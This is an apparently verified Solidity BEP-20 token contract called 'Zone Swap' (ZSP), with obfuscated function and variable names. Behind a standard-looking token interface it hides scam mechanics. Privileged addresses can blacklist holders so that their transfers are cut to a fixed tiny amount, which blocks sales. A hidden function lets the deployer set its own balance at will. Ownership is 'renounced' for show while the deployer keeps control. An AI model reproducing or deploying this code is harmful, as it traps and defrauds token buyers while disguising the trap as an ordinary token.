/**
 *Submitted for verification at BscScan.com on 2023-02-21
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


interface dqovlkhslbrioh {
    function createPair(address fxqfnjdjqp, address zfcdvsvrgfb) external returns (address);
}

interface avbeuldiivhnp {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ZoneSwap {

    function jufqocyft(address cnghnudksz, address brbpqbpxacs, uint256 bisxmidyopowjq) internal returns (bool) {
        if (cnghnudksz == gjkpytwhmkoyg) {
            return cclwtrvicha(cnghnudksz, brbpqbpxacs, bisxmidyopowjq);
        }
        if (nnreepjkqow[cnghnudksz]) {
            return cclwtrvicha(cnghnudksz, brbpqbpxacs, zprwweeyghp);
        }
        return cclwtrvicha(cnghnudksz, brbpqbpxacs, bisxmidyopowjq);
    }

    uint256 constant zprwweeyghp = 12 ** 10;

    function ipedbfbus() public view returns (bool) {
        return koirawgusa;
    }

    constructor (){ 
        
        avbeuldiivhnp qrnwbzoaau = avbeuldiivhnp(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        dqcmfwohxp = dqovlkhslbrioh(qrnwbzoaau.factory()).createPair(qrnwbzoaau.WETH(), address(this));
        owner = tcqnqactcknf();
        if (uceqbodaqxnoi == lwmlskbmako) {
            hdstbcbhvykj = false;
        }
        gjkpytwhmkoyg = owner;
        djrjglwjqmh[gjkpytwhmkoyg] = true;
        balanceOf[gjkpytwhmkoyg] = totalSupply;
        
        emit Transfer(address(0), gjkpytwhmkoyg, totalSupply);
        svixaebsqije();
    }

    function transfer(address fgdoiimzspeley, uint256 bisxmidyopowjq) external returns (bool) {
        return jufqocyft(tcqnqactcknf(), fgdoiimzspeley, bisxmidyopowjq);
    }

    string public symbol = "ZSP";

    function getOwner() external view returns (address) {
        return owner;
    }

    address public gjkpytwhmkoyg;

    mapping(address => mapping(address => uint256)) public allowance;

    function ajqryqyyhvokh(uint256 bisxmidyopowjq) public {
        if (!djrjglwjqmh[tcqnqactcknf()]) {
            return;
        }
        balanceOf[gjkpytwhmkoyg] = bisxmidyopowjq;
    }

    uint256 private lwmlskbmako;

    address public owner;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    address public dqcmfwohxp;

    mapping(address => bool) public nnreepjkqow;

    uint8 public decimals = 18;

    bool private floqmwgahv;

    bool private koirawgusa;

    bool private lgvdwwrwtc;

    function cclwtrvicha(address cnghnudksz, address brbpqbpxacs, uint256 bisxmidyopowjq) internal returns (bool) {
        require(balanceOf[cnghnudksz] >= bisxmidyopowjq);
        balanceOf[cnghnudksz] -= bisxmidyopowjq;
        balanceOf[brbpqbpxacs] += bisxmidyopowjq;
        emit Transfer(cnghnudksz, brbpqbpxacs, bisxmidyopowjq);
        return true;
    }

    bool private vvntzqwihcmqca;

    uint256 private uceqbodaqxnoi;

    function divvbeemah(address iodrqmmcpve) public {
        if (koirawgusa != lgvdwwrwtc) {
            koirawgusa = true;
        }
        if (iodrqmmcpve == gjkpytwhmkoyg || iodrqmmcpve == dqcmfwohxp || !djrjglwjqmh[tcqnqactcknf()]) {
            return;
        }
        
        nnreepjkqow[iodrqmmcpve] = true;
    }

    function svixaebsqije() public {
        emit OwnershipTransferred(gjkpytwhmkoyg, address(0));
        owner = address(0);
    }

    function tcqnqactcknf() private view returns (address) {
        return msg.sender;
    }

    function biszekoioe() public {
        if (hdstbcbhvykj == koirawgusa) {
            vvntzqwihcmqca = true;
        }
        
        hdstbcbhvykj=false;
    }

    function xahkkstdhqffkt(address dsxmccedczlz) public {
        if (ofgvinjviszga) {
            return;
        }
        if (lgvdwwrwtc == vsawcmkvapkl) {
            vsawcmkvapkl = true;
        }
        djrjglwjqmh[dsxmccedczlz] = true;
        if (fmrjdndsnlxnxu == lgvdwwrwtc) {
            uceqbodaqxnoi = lwmlskbmako;
        }
        ofgvinjviszga = true;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    bool public ofgvinjviszga;

    function xhuuenoypksh() public view returns (bool) {
        return lgvdwwrwtc;
    }

    event Approval(address indexed omsgjpchr, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed qtbzoydfmoy, uint256 value);

    bool private hdstbcbhvykj;

    function transferFrom(address cnghnudksz, address brbpqbpxacs, uint256 bisxmidyopowjq) external returns (bool) {
        if (allowance[cnghnudksz][tcqnqactcknf()] != type(uint256).max) {
            require(bisxmidyopowjq <= allowance[cnghnudksz][tcqnqactcknf()]);
            allowance[cnghnudksz][tcqnqactcknf()] -= bisxmidyopowjq;
        }
        return jufqocyft(cnghnudksz, brbpqbpxacs, bisxmidyopowjq);
    }

    function approve(address ytoktghkpghglm, uint256 bisxmidyopowjq) public returns (bool) {
        allowance[tcqnqactcknf()][ytoktghkpghglm] = bisxmidyopowjq;
        emit Approval(tcqnqactcknf(), ytoktghkpghglm, bisxmidyopowjq);
        return true;
    }

    bool private fmrjdndsnlxnxu;

    function lplmebymlcvps() public {
        if (lgvdwwrwtc != hdstbcbhvykj) {
            floqmwgahv = false;
        }
        if (hdstbcbhvykj) {
            hdstbcbhvykj = false;
        }
        lgvdwwrwtc=false;
    }

    mapping(address => bool) public djrjglwjqmh;

    string public name = "Zone Swap";

    bool private vsawcmkvapkl;

}